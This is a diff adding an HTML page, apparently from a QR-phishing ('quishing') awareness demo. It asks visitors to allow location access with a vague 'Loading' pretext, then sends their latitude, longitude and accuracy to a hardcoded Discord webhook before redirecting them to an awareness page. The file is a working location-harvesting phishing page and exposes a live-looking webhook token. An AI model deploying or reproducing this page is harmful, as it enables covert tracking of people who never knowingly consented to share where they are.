@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Location Access Test</title>
+</head>
+<body>
+    <h2>Loading, please allow location access...</h2>
+    <script>
+        const webhookURL = "https://discord.com/api/webhooks/1367886422333329438/HZ86N7lRRcOzeYAQQMDpZMUcfInQWLhz5D1Z6DJhqJki45Jx3VP8cVyNQ6lzyBg31mNr";  // Replace with your webhook
+        const redirectURL = "https://5t3p8r0.github.io/quishing/aware.html"; // Awareness page
+
+        if ("geolocation" in navigator) {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+                    const accuracy = position.coords.accuracy;
+
+                    const content = `📍 New Location Captured!\nLatitude: ${latitude}\nLongitude: ${longitude}\nAccuracy: ±${accuracy} meters`;
+
+                    const payload = {
+                        content: content
+                    };
+
+                    // Send to Discord
+                    fetch(webhookURL, {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json"
+                        },
+                        body: JSON.stringify(payload)
+                    })
+                    .then(response => {
+                        if (!response.ok) throw new Error(`HTTP error: ${response.status}`);
+                        return response.text();
+                    })
+                    .then(data => console.log("Location sent:", data))
+                    .catch(error => console.error("Failed to send location:", error));
+
+                    // Redirect after a short delay
+                    setTimeout(() => {
+                        window.location.href = redirectURL;
+                    }, 3000);
+                },
+                (error) => {
+                    alert("You denied location access or there was an error.");
+                    console.error("Geolocation error:", error);
+                }
+            );
+        } else {
+            alert("Geolocation is not supported by your browser.");
+        }
+    </script>
+</body>
+</html>
